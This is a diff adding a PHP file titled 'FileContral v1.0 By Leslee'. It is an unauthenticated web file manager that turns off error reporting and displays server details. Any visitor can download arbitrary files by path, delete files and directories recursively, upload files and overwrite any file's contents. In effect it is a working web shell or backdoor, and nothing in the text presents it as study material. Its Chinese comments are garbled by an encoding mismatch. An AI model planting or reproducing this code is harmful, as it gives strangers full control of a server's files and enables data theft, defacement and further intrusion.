@@ -1,0 +1,526 @@
+<?php
+/*
+
+ */
+error_reporting(0);
+/* …œ¥´Œƒº˛ */
+function upfile($file_var,$tofile,$filepath){
+	/* ≤Œ ˝Àµ√˜:
+
+	*/
+	if(!is_writable($filepath)){
+		echo"$filepath ERROR";
+		return false;
+		exit;
+	}
+	//echo $_FILES["$file_var"]['name'];
+	$Filetype=substr(strrchr($_FILES["$file_var"]['name'],"."),1);
+	($tofile==='')?($uploadfile = $_FILES["$file_var"]['name']):($uploadfile = $tofile.".".$Filetype);//Œƒº˛√˚
+	$Array[tofile] = $tofile.'.'.$Filetype;
+	$Array[oldfile]= $_FILES["$file_var"]['name'];
+	if(!($uploadfile==='')){
+		if (!is_uploaded_file($_FILES["$file_var"]['tmp_name'])){
+			echo $_FILES["$file_var"]['tmp_name']." ERROR.";
+			return false;
+			exit;
+		}
+
+		if (!move_uploaded_file($_FILES["$file_var"]['tmp_name'],$filepath.'/'.$uploadfile)){
+			echo "ERROR:\n";
+			print_r($_FILES);
+			exit;
+		}else{
+			return $Array;
+		}
+	}else{
+		return false;
+		echo"UPFILE ERROR";
+	}
+}
+/*…æ≥˝ƒø¬º*/
+function deletedir($dir)
+{
+	if(!$handle=@opendir($dir))
+	{//ºÏ≤‚“™¥Úø™µƒƒø¬º «∑Ò¥Ê‘⁄
+		echo "NO FOLDER".$dir;
+		//die("NO FOLDER");
+	}
+	while(false!==($file=readdir($handle)))
+	{
+		if($file!="."&&$file!="..")
+		{
+			$file=$dir.DIRECTORY_SEPARATOR.$file;
+			if(is_dir($file))
+			{
+				deletedir($file);
+			}
+			else
+			{
+				if(@unlink($file))
+				{
+					//echo "DEL OK<br>";
+				}
+				else
+				{
+					echo "DEL ERR<br>";
+				}
+			}
+		}
+	}
+	closedir($handle);
+	if(@rmdir($dir))
+	{
+		echo "<script>alert(\"DEL OK\")</script>";	
+	}
+	else
+	{
+		echo "DEL ERR".$dir;
+	}
+
+}
+/* ªÒ»°Œƒº˛¥Û–° */
+function getSize(&$fs)
+{
+	if($fs<1024)
+	return $fs."Byte";
+	elseif($fs>=1024&&$fs<1024*1024)
+	return @number_format($fs/1024, 3)." KB";
+	elseif($fs>=1024*1024 && $fs<1024*1024*1024)
+	return @number_format($fs/1024*1024, 3)." M";
+	elseif($fs>=1024*1024*1024)
+	return @number_format($fs/1024*1024*1024, 3)." G";
+}
+// œ¬‘ÿŒƒº˛
+if ($_GET['downfile']) {
+	$downfile=$_GET['downfile'];
+	if (!@is_file($downfile)) {
+		echo "<script>alert(\"NO FILE\")</script>";
+	}
+	$filename = basename($downfile);
+	$filename_info = explode('.', $filename);
+	$fileext = $filename_info[count($filename_info)-1];
+	header('Content-type: application/x-'.$fileext);
+	header('Content-Disposition: attachment; filename='.$filename);
+	header('Content-Description: PHP3 Generated Data');
+	readfile($downfile);
+	exit;
+}
+
+// …æ≥˝Œƒº˛
+if(@$_GET['delfile']!="") {
+	$delfile=$_GET['delfile'];
+	if(file_exists($delfile)) {
+		@unlink($delfile);
+	} else {
+		$exists="1";
+		echo "<script>alert(\"NO FILE\")</script>";
+	}
+	if(!file_exists($delfile)&&$exists!="1") {
+		echo"<script>alert(\"DEL OK\")</script>";
+	} else {
+		echo"<script>alert(\"DEL ERR\")</script>";
+	}
+}
+//…æ≥˝ƒø¬º
+if(@$_GET['deldir']!="")
+{
+	$deldir=$_GET['deldir'];
+	deletedir($deldir);
+}
+//±‡º≠Œƒº˛
+$edit_flag=false;
+if(@$_GET['editfile']!="")
+{
+	$flag_show=1;
+	$editfile=$_GET['editfile'];
+	if(file_exists($editfile))
+	{
+		$edit_flag=true;
+		$handle=fopen($editfile,"r");
+		$contentfile=fread($handle,filesize($editfile));
+		fclose($handle);
+	}
+	else
+	{ return false;
+	echo "<script>alert(\"ERROR\")</script>";
+	}
+
+}
+else
+{
+	$flag_show=0;
+}
+/* ºÏ≤‚µ±«∞ƒø¬º÷µ */
+$CurrentPath	= $_POST['path']?$_POST['path']:($_GET['path']?$_GET['path']:false);
+if($CurrentPath===false)
+{
+	$CurrentPath	= dirname(__FILE__);
+}
+$CurrentPath	= realpath(str_replace('\\','/',$CurrentPath));
+/* ºÏ≤ÈÕÍ±œ */
+/* –¬Ω® ƒø¬º */
+if($_POST['dirname'])
+{
+	$newdir	= $CurrentPath."/".$_POST['dirname'];
+	if(is_dir($newdir))
+	{
+		echo"<script>alert(\"ERR!\")</script>";
+		exit;
+	}else {
+		if(mkdir($newdir,0700))
+		{
+			echo"<script>alert(\"OK!\")</script>";
+		}else {
+			echo "<script>alert(\"ERR!\")</script>";
+		}
+	}
+}
+/* …œ¥´Œƒº˛ */
+if($_POST['upload'])
+{
+	if(!(upfile("upfiles",$_POST['fname'],$CurrentPath)))
+	{
+		echo"<script>alert(\"UP EOR!\")</script>";
+	}else {
+		echo "<script>alert(\"UP OK!\")</script>";
+	}
+}
+/* ±‡º≠ƒ⁄»›*/
+if($_POST['editcontent'])
+{
+	$path_up=$_POST['path_f'];
+	$contents_file_up=$_POST['contents_file'];
+	$handle=fopen($path_up,"w");
+	if($handle)
+	{
+		fwrite($handle,$contents_file_up);
+		fclose($handle);
+
+		//$url="http://".$_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
+		//header("location:".$url);
+		echo "<script>alert(\"EDIT OK\")</script>";
+		 
+
+	}
+	else
+	{
+		return false;
+		echo "<script>alert(\"EDIT EOR\")</script>";
+	}
+
+}
+?>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>FileContral v1.0 By Leslee</title>
+<script type="text/javascript">
+function edit()
+{
+
+
+   document.getElementById('edit').style.display="";
+	
+}
+</script>
+<style type="text/css">
+<!--
+body {
+	font-family: "ÀŒÃÂ";
+	font-size: 12px;
+	margin-left: 0px;
+	margin-top: 0px;
+}
+
+table {
+	font-family: "ÀŒÃÂ";
+	font-size: 12px;
+	text-decoration: none;
+}
+
+.bold_blue {
+	color: #003399;
+	font-weight: bold;
+}
+
+input {
+	border-right-width: 0.1mm;
+	border-bottom-width: 0.1mm;
+	border-top-style: none;
+	border-right-style: solid;
+	border-bottom-style: solid;
+	border-left-style: none;
+	border-right-color: #CCCCCC;
+	border-bottom-color: #CCCCCC;
+}
+-->
+</style>
+
+</head>
+<body>
+<table width="900" border="0" align="center" cellpadding="1"
+	cellspacing="0">
+	<tr>
+		<td align="center" bgcolor="#EFEFEF"><font >PHP:</font><font
+			><?php echo PHP_VERSION;?></font> &nbsp;&nbsp;&nbsp;<font
+			> SERVER:</font><font><?php echo php_uname();?></font></td>
+	</tr>
+	<tr>
+		<td bgcolor="#DDDDDD">
+		<table width="100%" height="100%" border="0" cellpadding="5"
+			cellspacing="1" bgcolor="#EFEFEF">
+			<tr>
+				<form name="form1" method="post" action="">
+				<td><span class="bold_blue"><strong>FOLDER</strong>:</span> <input
+					name="path" type="text" id="path"> <input type="submit"
+					name="Submit" value="GO">
+				  <span class="bold_blue">   <strong> NEW FOLDER</strong>:</span>
+                  <input
+					name="dirname" type="text" id="dirname">
+                  <input type="submit"
+					name="Submit2" value="SET"></td>
+				</form>
+			</tr>
+			<tr>
+				<form name="form2" method="post" action="">
+				<td>&nbsp;</td>
+			  </form>
+			</tr>
+			<form name="form3" method="post" action=""
+				enctype="multipart/form-data">
+			<tr>
+				<td><span class="bold_blue"><strong>UPFILE</strong>:</span> <input
+					name="upfiles" type="file" id="upfiles">
+				  <span class="bold_blue"><strong>NEW FILE</strong>:</span>
+                  <input
+					name="fname" type="test" id="fname">
+                  <input type="submit"
+					name="upload" value="UP"></td>
+			</tr>
+			<tr>
+				<td>&nbsp;</td>
+			</tr>
+			</form>
+			<tr>
+				<td><span class="bold_blue">PATH:</span><font><?php echo $CurrentPath;?></font></td>
+			</tr>
+		</table>		</td>
+	</tr>
+	<tr>
+		<td bgcolor="#DDDDDD">
+		<table width="100%" border="0" cellspacing="1" cellpadding="1">
+
+			<tr>
+				<td>
+				<table width="100%" border="0" cellpadding="1" cellspacing="1"
+					bgcolor="#EFEFEF">
+					<tr>
+						<td width="45%"><strong>FOLDER</strong></td>
+						<td width="55%">&nbsp;</td>
+					</tr>
+					<?php
+					$fso=@opendir($CurrentPath);
+					while ($file=@readdir($fso)) {
+						$fullpath	= "$CurrentPath/$file";
+						$is_dir		= @is_dir($fullpath);
+						if($is_dir=="1"){
+							if($file!=".."&&$file!=".")	{
+								echo "<tr bgcolor=\"#EFEFEF\">\n";
+								echo "<td cellpadding=5><a href=\"?path=".urlencode($CurrentPath)."/".urlencode($file)."\">$file</a></td>\n";
+								echo "<td cellpadding=5><a href=\"?path=".urlencode($CurrentPath)."&deldir=".urlencode($fullpath)."\">DEL</a></td>\n";
+								echo "</tr>\n";
+							} else {
+								if($file=="..")
+								{
+									echo "<tr bgcolor=\"#EFEFEF\">\n";
+									echo "<td cellpadding=5> <a href=\"?path=".urlencode($CurrentPath)."/".urlencode($file)."\">Parent directory</a></td>";
+									echo "</tr>\n";
+								}
+							}
+						}
+					}
+					@closedir($fso);
+					?>
+				</table>				</td>
+			</tr>
+
+			<tr>
+				<td>
+				<table width="100%" border="0" cellpadding="0" cellspacing="5"
+					bgcolor="#EFEFEF">
+		
+					<?php
+					$flag_file=0;//ºÏ≤‚ «∑Ò”–Œƒº˛
+					$fso=@opendir($CurrentPath);
+					while ($file=@readdir($fso)) {
+						$fullpath	= "$CurrentPath\\$file";
+						$is_dir		= @is_dir($fullpath);
+						if($is_dir=="0"){
+							$flag_file++;
+							$size=@filesize("$CurrentPath/$file");
+							$size=@getSize($size);
+							$lastsave=@date("Y-n-d H:i:s",filemtime("$CurrentPath/$file"));
+							echo "<tr bgcolor=\"#EFEFEF\">\n";
+							echo "<td> $file</td>\n";
+							echo "  <td>$lastsave</td>\n";
+							echo "  <td>$size</td>\n";
+							?>
+					<td><input type="hidden" id="<?php echo $flag_file."path"?>"
+						value="<?php echo $filec;?>"> <a
+						href="?downfile=<?php echo urlencode($CurrentPath)."/".urlencode($file);?>">DOWN</a> | <a
+						href="?editfile=<?php echo urlencode($CurrentPath)."/".urlencode($file);?>"
+						onclick="edit();">EDIT</a> | <a
+						href="?path=<?php echo urlencode($CurrentPath)."&delfile=".urlencode($CurrentPath)."/".urlencode($file);?>">DEL</a></td>
+						<?php
+						//	echo "  <td><a href=\"?downfile=".urlencode($CurrentPath)."/".urlencode($file)."\">DOWN</a> |<a href=\"?path=".urlencode($CurrentPath)."&delfile=".urlencode($CurrentPath)."/".urlencode($file)."\">DEL</a></td>\n";
+						echo "</tr>\n";
+						}
+					}
+					if($flag_file==0)
+					{
+						echo "<tr bgcolor=\"#EFEFEF\">\n";
+						echo "<td align=\"center\" colspan=\"3\"><font style=\"color:red;\" size=\"10\">NO FILE</font></td>";
+						echo "</tr>\n";
+					}
+					@closedir($fso);
+					?>
+				</table>				</td>
+			</tr>
+			<tr>
+				<td bgcolor="#EFEFEF"><strong>EDIT</strong></td>
+			</tr>
+			<tr>
+				<td>
+				<div id="edit" <?php if($flag_show==0) {?> style="display: none"
+				<?php }?>>
+				<table width="100%" border="0" cellpadding="0" cellspacing="5"
+					bgcolor="#EFEFEF">
+					<form name="edit" method="post" action="">
+					<tr>
+						<td><input type="hidden" name="path_f"
+							value="<?php echo $editfile;?>"></input> <textarea name="contents_file" cols="900" rows="90"
+							id="contents_edit"
+							style="width: 900 ; overflow-y: visible;"><?php if($edit_flag){ echo $contentfile;?><?php }else{ echo "no" ;}?>
+							</textarea></td>
+					</tr>
+					<tr>
+						<td><input style="background-color: gray" type="submit"
+							name="editcontent" value="submit"></input></td>
+					</tr>
+					</form>
+				</table>
+				</div>				</td>
+			</tr>
+		</table>		</td>
+	</tr>
+</table>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
